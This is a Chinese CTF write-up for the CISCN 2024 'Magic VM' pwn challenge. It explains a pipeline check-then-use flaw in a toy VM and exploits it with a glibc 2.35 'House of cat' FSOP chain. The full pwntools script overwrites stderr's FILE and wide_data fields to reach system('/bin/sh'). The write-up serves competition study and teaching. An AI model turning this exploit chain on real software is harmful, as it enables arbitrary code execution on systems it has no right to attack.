# CISCN 2024 Pwn VM writeup

> **来源**: https://forum.butian.net/share/3048  
> **文章ID**: 3048

---

Magic VM
--------

题目逻辑
----

题目本身其实非常的有趣，它实现了一个简易流水线的功能，程序中包含四个结构体，其中三个分别对应流水线中的三个流程：

- ID
- ALU
- MEM

程序用一个叫做`vm`的结构体来统筹这三个对象，并且使用`vm_id vm_alu vm_mem`来控制整体的逻辑处理过程。

```cpp
struct __attribute__((aligned(8))) vm
{
  char *reg0[4];
  __int64 now_stack_ptr;
  unsigned __int64 pc;
  char *code_base;
  __int64 data_base;
  __int64 stack_base;
  __int64 code_size;
  __int64 data_size;
  __int64 stack_size_;
  vm_id *id;
  vm_alu *alu;
  vm_mem *mem;
};

/* 6 */
struct __attribute__((aligned(8))) vm_alu
{
  char *is_valid;
  __int64 each_opcode_OPTYPE;
  __int64 ops_total_type;
  __int64 op1_addr_or_reg;
  __int64 op2_addr_or_reg;
  int result_type;
  int mem_num;
  __int64 dst_op_value;
  __int64 alu_result;
  __int64 now_stack_ptr;
  __int64 stack_ptr;
};

/* 7 */
struct __attribute__((aligned(8))) vm_mem
{
  int mem_valid_result_type;
  int mem_idx;
  __int64 dst_op_value;
  __int64 src_alu_result;
  __int64 now_stack_ptr;
  __int64 next_vm;
};

/* 8 */
struct __attribute__((aligned(8))) vm_id
{
  char *is_valid;
  __int64 each_opcode;
  __int64 ops1_total_type;
  __int64 op1_addr_or_reg;
  __int64 op2_addr_or_reg;
};

```

题目主要逻辑很简单，会用一个`mmap`的空间来作为代码段，数据段和栈帧：

```cpp
void __fastcall vm::vm(vm *this)
{
  vm_id *id; // rax
  vm_alu *alu; // rax
  vm_mem *mem; // rax
  __int64 i; // rdx

  this->code_base = (char *)mmap(0LL, 0x6000uLL, 3, 34, -1, 0LL);
  this->data_base = (__int64)(this->code_base + 0x2000);
  this->stack_base = this->data_base + 0x3000;
  this->data_size = 0x3000LL;
  this->code_size = 0x2000LL;
  this->stack_size_ = 0x1000LL;

  // skip code...
}
```

代码段大小为0x2000，数据段为0x3000，栈帧为0x1000。

```cpp
+----------------------------+
|                            |
|    0x2000 code             |
|                            |
|                            |
|                            |
|                            |
+----------------------------+
|                            |
|                            |
|    0x3000 data             |
|                            |
|                            |
|                            |
|                            |
|                            |
|                            |
|                            |
+----------------------------+
|                            |
|    0x1000 stack            |
|                            |
|                            |
+----------------------------+
```

其中代码段存放我们读入的数据作为指令，并且再`vm::run`中进行解码译码

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "plz input your vm-code");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  read(0, my_vm.code_base, 0x2000uLL);
  vm::run(&my_vm);
  return 0;
}
```

解码逻辑如下

```cpp
__int64 __fastcall vm::run(vm *vm)
{                                               // 第一次读取到id
                                                // 第二次alu发生运算
                                                // 第三次mem发生位移
  __int64 v1; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  while ( 1 )
  {
    vm_alu::set_input(vm->alu, vm);
    vm_mem::set_input(vm->mem, vm);
    vm->pc += (int)vm_id::run(vm->id, vm);
    v3 = vm_alu::run(vm->alu, vm);
    vm_mem::run(vm->mem, vm);
    if ( !v3 )
      break;
    if ( v3 == -1 )
    {
      v1 = std::operator<<<std::char_traits<char>>(&std::cout, "SOME STHING WRONG!!");
      std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
      exit(0);
    }
  }
  return 0LL;
}
```

其中对应关系如下

- `vm_id::run`:ID 译码阶段，进行指令的翻译和边界检查
- `vm_alu::run`:ALU 阶段，对译码的指令进行执行，计算等
- `vm_mem::run`:MEM 阶段，将计算阶段的结果存放在译码阶段指定的地址

循环开头的两个`set_input`会如同流水线般，将**上次循环中得到的数据传递给下一个阶段**:

```php
             +----------+                                   
             |          |                                   
Loop 1       |   ID 1   |                                   
             |          |                                   
             +-----+----+                                   
                   |                                        
                   +--------------+                         
                                  |                         
             +-----------+   +----v------+                  
             |           |   |           |                  
Loop 2       |   ID 2    |   |   ALU 1   |                  
             |           |   |           |                  
             +-----+-----+   +-----+-----+                  
                   |               |                        
                   |               +-----------------+      
                   +--------------+                  |      
                                  |                  |      
                                  |                  |      
             +-----------+   +----v-------+   +------v-----+
             |           |   |            |   |            |
Loop 3       |   ID 3    |   |   ALU 2    |   |   MEM 1    |
             |           |   |            |   |            |
             +-----------+   +------------+   +------------+
```

可以得出结论：

> 当前指令再循环1被ID解析的读入数据，会在循环3被MEM进行存储

举例来说，假设对于指令`mov r1, r2`，这个程序的处理逻辑如下：

- 第一次循环中，由`vm_id`读取指令，解析操作数
- 第二次循环中，在`vm_alu::set_input`中，将`id`中的数据传递给`alu`，此时调用`vm_alu::run`进行计算操作
- 第三次循环中，在`vm_mem::set_input`中，将`alu`中的数据传递给`mem`，此时调用`vm_mem::run`进行赋值操作

**在这个虚拟机中，无论操作寄存器，还是内存地址，均需要使用三步操作完成。**

由前面的定义可知，程序的`id`中只记录操作类型，`alu`记录操作类型，计算结果和存储位置，`mem`仅记录存储位置。

### ID 译码

在译码阶段，会涉及虚拟机的一些支持的指令类型，在虚拟机中包含三个寄存器，以及栈帧，支持地址访问和十种操作：

```php
opcode = {
    "ADD":1,
    "SUB":2,
    "SHL":3,
    "SHR":4,
    "MOV":5,
    "AND":6,
    "OR":7,
    "XOR":8,
    "PUSH":9,
    "POP":10,
    "NOP":11,
}
```

指令格式如下

```php
[opcode][optype][value1][value2]
```

其中`optype`定义了两个操作数的类型。第1，2bit用于定义第一个操作数的类型，第3，4bit用于定义第二个操作数类型。类型支持如下三种

- NUM（1）:仅当成数据，value长度为8字节
- REG（2）:作为寄存器下标（0~3）value长度为1字节
- ADDR（3）:将value作为寄存器下标（0~3），取寄存器的值当成地址，

其中，当我们的使用`id`解析类似`mov r1, [r2]`的模拟指令的时候，会检查`r2`是否超出了`database`的范围

```cpp
else if ( ope1_type == OP_ADDR )            // 均为1，作为地址解析
{
    opcode_len = 3;
    v6 = buf_ptr_next2;
    buf_ptr_next2 = (__int64 *)((char *)buf_ptr_next2 + 1);
    v13 = *(_BYTE *)v6;
    if ( vm_id::check_addr(id, (unsigned __int64)vm->reg0[*(char *)v6], vm) )   // 检查当前寄存器中指向的值是否越界
    {
    id->each_opcode = each_opcode;
    id->op1_addr_or_reg = v13;              // 此时为地址
    }
    else
    {
    id->each_opcode = -1LL;
    }
}
```

如果直接使用寄存器，则同样的也会检测选择寄存器的时候是否会选择0~3以外的寄存器

```cpp
if ( ope1_type == OP_REG )                  // 检查第一个ops类型
{
    opcode_len = 3;
    v5 = buf_ptr_next2;
    buf_ptr_next2 = (__int64 *)((char *)buf_ptr_next2 + 1);
    v12 = *(_BYTE *)v5;
    if ( vm_id::check_regs(id, *(char *)v5, vm) )// 检查是否为寄存器
    {
    id->each_opcode = each_opcode;
    id->op1_addr_or_reg = v12;              // 此时为寄存器
    }
    else
    {
    id->each_opcode = -1LL;
    }
}
```

之后，ID对象就会记录以下数据，之后会在下一个循环中传递给ALU

- 指令
- 操作数类型
- 操作数1
- 操作数2

### ALU 计算

在`ALU`进行计算的时候，会根据由`ID`传递的操作类型，取出对应的寄存器或者内存地址

```cpp
v4 = vm_alu->ops_total_type & 3;
if ( v4 == OP_REG )                         // 检查第一个操作数的类型
{
    vm_alu->mem_num = 1;
    vm_alu->dst_op_value = (__int64)&vm->reg0[vm_alu->op1_addr_or_reg];// 寄存器的操作
    vm_alu->op1_addr_or_reg = (__int64)vm->reg0[vm_alu->op1_addr_or_reg];
}
else
{
    if ( v4 != OP_ADDR )
    return 0xFFFFFFFFLL;                    // 第一个类型需要为地址，同时使得op1_addr_or_reg为越界的地址
    if ( (vm_alu->ops_total_type & 0xC) == 12 )
    return 0xFFFFFFFFLL;
    vm_alu->mem_num = 1;
    vm_alu->dst_op_value = (__int64)&vm->reg0[vm_alu->op1_addr_or_reg][vm->data_base];// 否则，作为地址操作
    vm_alu->op1_addr_or_reg = *(_QWORD *)&vm->reg0[vm_alu->op1_addr_or_reg][vm->data_base];// vm_start+op1_offset+data_base
}
```

注意，在`ALU`中，会把我们的操作数1作为**目的操作数**，无论里面指定的是寄存器还是内存地址，都会取出其指针放在`dst_op_value`，之后就会进行运算操作。

```cpp
switch ( vm_alu->each_opcode_OPTYPE )
    {
      case ADD:
        vm_alu->alu_result = vm_alu->op2_addr_or_reg + vm_alu->op1_addr_or_reg;
        break;
      case MIN:
        vm_alu->alu_result = vm_alu->op1_addr_or_reg - vm_alu->op2_addr_or_reg;
        break;
      case LMOV:
        vm_alu->alu_result = vm_alu->op1_addr_or_reg << vm_alu->op2_addr_or_reg;
        break;
      case RMOV:
        vm_alu->alu_result = (unsigned __int64)vm_alu->op1_addr_or_reg >> vm_alu->op2_addr_or_reg;
        break;
      case OP2:
        vm_alu->alu_result = vm_alu->op2_addr_or_reg;
        break;
      case AND:
        vm_alu->alu_result = vm_alu->op2_addr_or_reg & vm_alu->op1_addr_or_reg;
        break;
      case OR:
        vm_alu->alu_result = vm_alu->op2_addr_or_reg | vm_alu->op1_addr_or_reg;
        break;
      case XOR:
        vm_alu->alu_result = vm_alu->op2_addr_or_reg ^ vm_alu->op1_addr_or_reg;
        break;
      default:
        goto EXITCALC;
    }
    goto EXITCALC;
```

完成计算后，下列值会被保留，传递给`MEM`

- `alu_result`：计算的结果
- `dst_op_value`：用于存放运算结果的地址
- `mem_num`：发生了变化的内存地址，如果是`PUSH`或者`POP`指令，此时会需要改变内存地址的值（栈指针，栈指向的内存）
- `result_type`：表示当前运算是否有效（指令是否正确等等），会传递给`MEM`的`mem_valid_result_type`成员

### MEM 存放

`MEM`部分比较简单，会根据来自`ALU`传递的值进行赋值处理

```cpp
__int64 __fastcall vm_mem::run(vm_mem *this, vm *a2)
{
  __int64 mem_valid; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  mem_valid = (unsigned int)this->mem_valid_result_type;
  if ( (_DWORD)mem_valid )
  {
    for ( i = 0; ; ++i )
    {
      mem_valid = (unsigned int)this->mem_idx;
      if ( i >= (int)mem_valid )
        break;
      **((_QWORD **)&this->dst_op_value + 2 * i) = *(&this->src_alu_result + 2 * i);
    }
  }
  return mem_valid;
}
```

这里再提一次，在这个虚拟机模拟过程中，虽然它也实现了寄存器，但是对寄存器的操作本质上等同对内存地址空间的操作，也是使用引用进行赋值，所以本质上等同内存操作。

### 程序漏洞

乍一看，程序的执行非常有逻辑：

- ID 解析指令，并且检查访问是否越界
- ALU 根据ID 解析的结果进行数据的分析计算
- MEM 存储对应的数据

但是这里有一个非常典型的问题，那就是：**检查和使用不处在同一个上下文中**。这句话怎么理解呢？对于这个题目而言，**上下文**就是指**在同一个循环中**。我们根据题目会发现，程序进行变量检查的时候**发生在ID环节**，而当进入`ALU`环节的时候，已经在下一个循环，而进入`MEM`环节，甚至在下两个循环了。这样会有什么问题呢？让我们假设一系列指令如下:

```php
0:add r1, 0xffff
1:mov r1, 0
2:add r2, [r1]
3:nop
4:nop
```

最初的时候，0被解析

```php
0:add r1, 0xffff    < --- ID
1:mov r1, 0
2:add r2, [r1]
3:nop
4:nop
```

当执行1的时候，1被解析，0被计算

```php
0:add r1, 0xffff    < --- ALU
1:mov r1, 0         < --- ID
2:add r2, [r1]
3:nop
4:nop
```

我们来讨论当执行2的时候，发生了什么

```php
0:add r1, 0xffff    < --- MEM
1:mov r1, 0         < --- ALU
2:add r2, [r1]      < --- ID
3:nop
4:nop
```

正常逻辑上讲，当我们执行到2的时候，由于`r1=0xffff`，超出了database，此时理论上这条指令是没办法由ID进行解析的。然而实际上此时执行的内容是这样的

```php
0:add r1, 0xffff    < --- MEM
1:mov r1, 0         < --- ALU
2:add r2, [0]       < --- ID  这里发生了什么？
3:nop
4:nop
```

正如我们前面提到的**流水线问题**，这里r1也正处在`MEM`阶段，而且根据代码逻辑，此时为**ID->ALU->MEM**的调用顺序，也就是说此时的r1仍未被正确赋值。  
那么根据逻辑来说，此时的2这条指令**能够通过ID的解码阶段**。那么，当执行3的时候，会变成这样

```php
0:add r1, 0xffff
1:mov r1, 0         < --- MEM
2:add r2, [r1]      < --- ALU
3:nop               < --- ID
4:nop
```

根据执行顺序，此时的`ALU`阶段中，r1已经被赋值成了`0xffff`，但是依然通过了ID的check。

```php
0:add r1, 0xffff
1:mov r1, 0         < --- MEM
2:add r2, [0xffff]  < --- ALU  发生了越界访问！！！
3:nop               < --- ID
4:nop
```

综合流程，我们可以通过这个漏洞获得**越界的任意地址加减**的能力。

### EXP

实际上，这个题目基本上也算是获得了**任意位置读写**的能力，不过在比赛期间我比较着急，没有想的那么清楚，以为只有一个**任意地址加减**的能力，下文也将以这个前提讨论漏洞利用。

由于本人不太熟悉`2.35`的利用手法，于是咨询了队友，在队友的提示下考虑到可以通过文件指针操作来进行攻击，攻击方式可以[参考这里](https://bbs.kanxue.com/thread-273895.htm) 提到的一种叫做`House of cat`的攻击策略，简单来说就是`FSOP`，但是使用的是`_OI_wfile_JUMP`的表，并且利用类似`House of Emma`的思路，对vtable偏移进行微调，从而实现调用`seekoff`函数，实现劫持。

程序自带一个`exit`函数，所以当我们完成了指令的编写之后，它自然会通过`exit`退出程序，通过`_IO_flush_all_lockp`诱发漏洞。

这种利用方式其实蛮多人利用过，[这位师傅](https://bbs.kanxue.com/thread-273895.htm)已经讲的很清楚了，我基本上就是照着这位师傅提到的点进行布局。  
在这道题在做的时候，有一个小坑，在这个文章中的评论区也有人提到，也就是`mode`参数不对：

```cpp
__off64_t __fastcall IO_wfile_seekoff(_IO_FILE *file, __int64 offset, unsigned int dir, int mode)
{
   v4 = a1;
  v101 = __readfsqword(0x28u);
  wide_data = file->_wide_data;
  if ( !a4 )
  {
    // 这其中无法使用当前攻击流程
  }

  _IO_write_base = (unsigned __int64)wide_data->_IO_write_base;
  _IO_write_ptr = (unsigned __int64)wide_data->_IO_write_ptr;
  v9 = offset;
  if ( *(_OWORD *)&wide_data->_IO_read_base == __PAIR128__(_IO_write_ptr, wide_data->_IO_read_end) )
  {
    LODWORD(v93) = 1;
  }
  else
  {
    LODWORD(v93) = 0;
    if ( _IO_write_base < _IO_write_ptr )
      goto LABEL_4;
  }
  if ( (file->_flags & 0x800) == 0 )
  {
    if ( wide_data->_IO_buf_base )
      goto LABEL_6;
    goto LABEL_36;
  }
LABEL_4:
  v10 = IO_switch_to_wget_mode(&file->_flags);      /// 关键要进入这个函数
}

__int64 __fastcall IO_switch_to_wget_mode(_IO_FILE *a1)
{
  struct _IO_wide_data *wide_data; // rax
  wchar_t *IO_write_ptr; // rdx
  __int64 result; // rax
  int flags; // ecx

  wide_data = a1->_wide_data;
  IO_write_ptr = wide_data->_IO_write_ptr;
  if ( IO_write_ptr > wide_data->_IO_write_base )
  {
    result = (*((__int64 (__fastcall **)(_IO_FILE *, __int64))wide_data->_wide_vtable + 3))(a1, 0xFFFFFFFFLL); // 关注这里
    if ( (_DWORD)result == -1 )
      return result;
    wide_data = a1->_wide_data;
    IO_write_ptr = wide_data->_IO_write_ptr;
  }
  // 包含其他逻辑
}
```

攻击链使用的是`IO_switch_to_wget_mode`函数，但是这个函数需要在参数`mode!=0`的时候触发，而在这道题的时候不满足这条条件，追踪调用流能看到对应的位置发生赋值的地方:

```cpp
__int64 __fastcall IO_flush_all_lockp(int a1){

  // 省略部分代码
      if ( file->_mode > 0 )
      {
        _wide_data = file->_wide_data;
        v3 = _wide_data->_IO_write_base;
        if ( _wide_data->_IO_write_ptr > v3 )
          goto LABEL_8;
      }
      else if ( file->_IO_write_ptr > file->_IO_write_base )
      {
LABEL_8:
        vtable = *(_QWORD *)&file[1]._flags;
        if ( &unk_7FC0EAE64768 - (_UNKNOWN *)qword_7FC0EAE63A00 <= (unsigned __int64)(vtable - (_QWORD)qword_7FC0EAE63A00) )
        {
          v14 = *(_QWORD *)&file[1]._flags;
          sub_7FC0EACD6EF0(lock, vtable - (_QWORD)qword_7FC0EAE63A00);
          vtable = v14;
        }
        lock = (__int64 *)&file->_flags;
        if ( (*(unsigned int (__fastcall **)(void *, __int64, void *, void *))(vtable + 24))(  //OVERFLOW 函数调用
               file,
               0xFFFFFFFFLL,
               (void *)v8,
               v3) == -1 )

```

*其实本来这里的`v3`（也就是第四个参数mode）是不存在的，但是毕竟我们是强制修改了调用函数的位置，所以这里相当于强行激活了这个参数。*  
观察程序可知，第四个参数来自于`_wide_data->_IO_write_base`，同时还必须保证`file->_mode > 0`以及`_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`才能满足，于是这个位置新增需求如下

- `file->_mode > 0`
- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`（只有大于才会赋值v3）
- `_wide_data->_IO_write_base != 0`（满足seekoff函数的mode）

梳理所有的需求，可以知道这个板子的调用条件为:

- `FILE->_IO_write_base`<`FILE->_IO_write_ptr`
- `wide_data->_IO_write_base` < `wide_data->_IO_write_ptr`
- `wide_data->_IO_read_end` != `wide_data->_IO_read_ptr`
- `FILE->_lock`可写（这一个条件来自于之前提到的`_IO_flush_all_lockp`函数要求）
- `file->_mode > 0`
- `_wide_data->_IO_write_base != 0`（满足seekoff函数的mode）

总共六条。同时为了实现利用，需要修改如下的点:

- `FILE->flag="/bin/sh"`
- `wide_data->jump(0xe0 offset)->0x18 = system`

两条要求，总共八条。

### 一些踩坑

- 由于我以为题目仅有**任意地址加减**的能力，于是在利用过程中**使用了已有的stderr 流，利用其中残留的指针进行相对偏移，从而实现漏洞利用**。
- 我这里使用的是异常流，但是为了诱导程序触发`flush`，需要保证异常流中存在缓存。而这一题默认情况下异常流是空的，所以还需要通过主动的修改`FILE->_IO_write_base`<`FILE->_IO_write_ptr`来保证攻击能够触发。

整体exp如下

```python
from pwn import *

"""
[opcode][optype][value1][value2]
"""

opcode = {
    "ADD":1,
    "SUB":2,
    "LMOV":3,
    "RMOV":4,
    "OP2":5,
    "AND":6,
    "OR":7,
    "XOR":8,
    "PUSH":9,
    "POP":10,
    "NOP":11,
}

# push and pop will select this one default
RET_REG = 1

def generate_type(t):
    if t == "NUM":
        # address
        return 1
    elif t == "ADDR":
        # address
        return 3
    else:
        # register
        return 2

# push last value into stack
def push_value():
    shellcode = b''
    shellcode += p8(opcode["PUSH"])
    # push value
    # optype
    shellcode += p8(generate_type("REG"))
    # opvalue, select reg1
    shellcode += b'\x01'
    return shellcode

# push last value into stack
def add_value(value):
    shellcode = b''
    shellcode += p8(opcode["ADD"])
    # push value
    # optype
    # add reg,num
    shellcode += p8(((generate_type("NUM") << 2) | generate_type("REG")))
    # opvalue, select reg1
    shellcode += p8(RET_REG)
    shellcode += p64(value)

    return shellcode

def sub_value_reg(value):
    shellcode = b''
    shellcode += p8(opcode["SUB"])
    # push value
    # optype
    # sub [reg],num
    shellcode += p8(((generate_type("NUM") << 2) | generate_type("REG")))
    # opvalue, select reg1
    shellcode += p8(RET_REG)
    shellcode += p64(value)

    return shellcode

def sub_value(value):
    shellcode = b''
    shellcode += p8(opcode["SUB"])
    # push value
    # optype
    # sub [reg],num
    shellcode += p8(((generate_type("NUM") << 2) | generate_type("ADDR")))
    # opvalue, select reg1
    shellcode += p8(RET_REG)
    shellcode += p64(value)

    return shellcode

def xor_value_reg(value):
    shellcode = b''
    shellcode += p8(opcode["XOR"])
    shellcode += p8(((generate_type("NUM") << 2) | generate_type("REG")))
    # opvalue, select reg1
    shellcode += p8(3)
    shellcode += p64(value)

    return shellcode

# pop value out of stack
def pop_value():
    shellcode = b''
    shellcode += p8(opcode["POP"])
    # push value
    # optype
    shellcode += p8(generate_type("REG"))
    # opvalue, select reg1
    shellcode += b'\x01'
    return shellcode

# set result with value and reg
def set_value_reg(value, reg):
    shellcode = b''
    shellcode += p8(opcode["OP2"])
    # push value
    # optype
    types = ((generate_type("NUM") << 2) | generate_type("REG"))
    shellcode += p8(types)
    # opvalue, select reg1
    shellcode += p8(reg)
    # opvalue as op2
    shellcode += p64(value)
    return shellcode

def nop():
    shellcode = b''
    shellcode += p8(opcode["NOP"])
    return shellcode

OFFSET_TO_LIBC = 0x9000
def off(offset):
    return OFFSET_TO_LIBC+offset

def generate_read(offset, value):
    shellcode = b''
    # here set the mov offset
    shellcode += add_value(offset) # ID
    shellcode += set_value_reg(0, RET_REG) # ALU
    # here use add/sub to calculate the 
    shellcode += sub_value(value) # ID -> MEM
    shellcode += nop() # ALU calculate
    shellcode += nop() # MEM saving data

    return shellcode

# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
ph = process("./pwn")
# gdb.attach(ph)

# libc offset
LIBC_STDERR = 0x21b6a0
# stderr_vtable = libc + 0xd8
STDERR_VTABLE = LIBC_STDERR + 0xd8
# wide_data = libc + 0x21a8a0
WIDE_DATA = 0x21a8a0
# IO_READ_PTR = wide_data+0 bypass check1
IO_READ_PTR_OFF = 0
# IO_READ_PTR = wide_data+0 bypass check2
IO_WRITE_PTR_OFF = 0x20
# OVERFLOW call
WFILE_JUMP = 0x2170c0
_IO_WOVERFLOW_OFFSET=0x18
# modify it to system

SYSTEM = 0x50D70
_IO_WFILE_OVERFLOW = 0x086390
# _IO_2_1_stderr_+131 = 0x7f492b71a723
# system  = 0x7f492b54fd70
# system_off = _IO_2_1_stderr_+131  - system = 0x1ca9b3
# minuse to /bin/sh

SYSTEM_OFF = _IO_WFILE_OVERFLOW - SYSTEM
# modified vtable
# IO_wfile_jumps
# _IO_file_jumps - _IO_wfile_jumps + 0x30(offset to seekoff)
# modify vtbale
# modify _wide_data(0xa0)->_IO_read_ptr
# modify _wide_data(0xa0)->_IO_write_ptr
# _wide_data(0xe0)??? no need to modify
# _wide_data->WFILE_JUMP->IO(0x18) 
#  x /40gx (char*)&_IO_2_1_stderr_
# 0xffffffffffffba20
# finally comes to function _IO_switch_to_wget_mode to call
shellcode1 = generate_read(off(STDERR_VTABLE), 0x510) + generate_read(off(LIBC_STDERR+0x28), 0xffffffffffffff00)+ generate_read(off(LIBC_STDERR+0xc0), 0xffffffffffffffff) + generate_read(off(WIDE_DATA), 0xfffffffffffffaf0) + generate_read(off(WIDE_DATA+0x18), 0xfffffffffffffaf0) + generate_read(off(WIDE_DATA+0x20), 0xfffffffffffffa00) + generate_read(off(WIDE_DATA+0x20), 0xffffffffffffff00) + generate_read(off(WIDE_DATA+0xe0), 0xffffffffffffba20) + generate_read(off(LIBC_STDERR+0x18), 0x1ca9b3) + generate_read(off(LIBC_STDERR), 0xff978cd18d43be58) 
# set debug 
debug_shellcode = xor_value_reg(0)
debug_shellcode += nop()
debug_shellcode += nop()

ph.sendline(shellcode1+debug_shellcode)

ph.interactive()

```

总结
--

- 题目的设计非常有意思，流水线是一种比较实际的场景，这种漏洞模式在真实场景中甚至会存在，具有学习价值
- 板子题我本人做的不多，所以调试花了非常多的时间，在这里感谢帮忙一并调试的师傅们~
